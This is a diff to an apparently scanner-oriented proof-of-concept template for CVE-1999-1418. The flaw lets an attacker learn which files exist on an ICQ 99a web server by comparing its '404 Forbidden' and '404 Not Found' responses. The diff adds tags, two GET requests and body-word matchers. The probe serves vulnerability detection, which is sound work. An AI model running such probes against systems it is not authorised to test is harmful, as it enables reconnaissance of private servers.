@@ -1,10 +1,14 @@
 [info]
 author = "ave"
-description = "验证 ICQ 99a Web 服务器 build 1701 的 'Active Homepage' 功能是否存在文件存在性信息泄露漏洞。远程攻击者可通过向服务器发送 HTTP 请求并对比响应状态码——文件存在时返回 '404 Forbidden'、文件不存在时返回 '404 not found'——来探测服务器上任意文件是否存在。"
+description = "ICQ 99a 内置 Web 服务器（build 1701）在启用 Active Homepage 功能时，对不同文件存在状态返回不同的 404 错误信息（文件存在返回 '404 Forbidden'，文件不存在返回 '404 Not Found'），导致远程攻击者可枚举服务器上敏感文件的存在性。"
 id = "POC-AVE-1999-1103"
-name = "ICQ 99a ICQ Web Server File Existence Information Leakage PoC"
+name = "ICQ 99a Web Server File Existence Information Leakage PoC"
 severity = "medium"
-tags = ["cve-1999-1418"]
+tags = [
+    "cve-1999-1418",
+    "icq",
+    "information-disclosure",
+]
 vuln_id = [
     "CVE-1999-1418",
     "AVE-1999-1103",
@@ -15,14 +19,31 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/nonexistent_file.html"
+path = "/{{BaseURL}}/index.html"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["404 Forbidden"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent_file_check"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "404 Forbidden",
     "404 not found",
+    "404 Not Found",
 ]
